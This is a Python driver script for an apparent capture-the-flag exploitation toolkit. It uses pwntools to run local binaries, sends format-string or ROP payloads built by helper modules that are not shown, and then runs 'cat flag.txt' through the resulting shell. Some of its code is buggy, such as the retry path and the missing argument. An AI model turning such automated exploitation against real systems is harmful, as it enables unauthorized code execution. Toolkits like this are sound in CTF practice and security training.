#!/usr/bin/env python3
from pwn import *
import sys
from analyze import *
import Fart_FMT
import Fart_ROP
import time
import traceback
from multiprocessing import Process
import os
from Print import Print

logging.getLogger('pwnlib').setLevel(logging.WARNING)

banner = '''
   ad88                                
  d8"                           ,d     
  88                            88     
MM88MMM ,adPPYYba, 8b,dPPYba, MM88MMM  
  88    ""     `Y8 88P'   "Y8   88     
  88    ,adPPPPP88 88           88     
  88    88,    ,88 88           88,    
  88    `"8bbdP"Y8 88           "Y888
  
  Format And ROP Toolkit \U0001F4A8 
'''


fire = "\U0001F525"

gs = '''
b win
continue
'''
context.terminal = ["tmux", "splitw", "-h"]

fart_print = Print()

def start(binary):
    e = context.binary = ELF(binary)
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

def exploit(analyize):
    binary = analyze.binary
    p = start(binary)
    payload = None
    
    if not analyze.has_leak():
        rop = Fart_ROP.ROP(analyze)
        try:
            send(rop.build_exploit(), p, analyze)
        except EOFError:
            p2 = process(binary)
            send(rop.build_exploit(failed=True), p, analyze)
            p2.close()
    else:
        fmt = Fart_FMT.FMT(analyze)
        send(fmt.build_exploit(), p, analyze)

    p.close()

def send(payload, p, analyze):

    if payload:
        p.sendline(payload)
        if analyze.has_binsh():
            sleep(0.1)
            p.sendline(b"cat flag.txt")
        p.recvuntil(b"flag")
        fart_print.success(f"{analyze.binary}: fart{p.recvuntil(b'}').decode('utf-8')}")

def __libc_fart_main(binary, debug):
    global analyze
    try: 
        analyze = Analyze(binary)
        exploit(analyze)
    except Exception as e:
        fart_print.warning("Well this stinks! We've encountered an exception we don't know how to handle!")
        if debug:
            fart_print.error("Exception Type: " + str(e.__class__.__name__))
            fart_print.error("Exception Message: " + str(e))
            fart_print.error(traceback.format_exc())

if __name__ == "__main__":
    fart_print.green(banner)
    
    debug = args.DBG
    
    bins_dir = args.DIR
    bins = []
    
    if bins_dir:
        for binary in os.listdir(bins_dir):    
            bins.append(bins_dir + "/" + binary)
    
        for binary in bins:
            #proc = Process(target=__libc_fart_main, args=(binary,))
            #proc.start()
            __libc_fart_main(binary, debug)
    else:
        binary = args.BIN
        __libc_fart_main(binary)
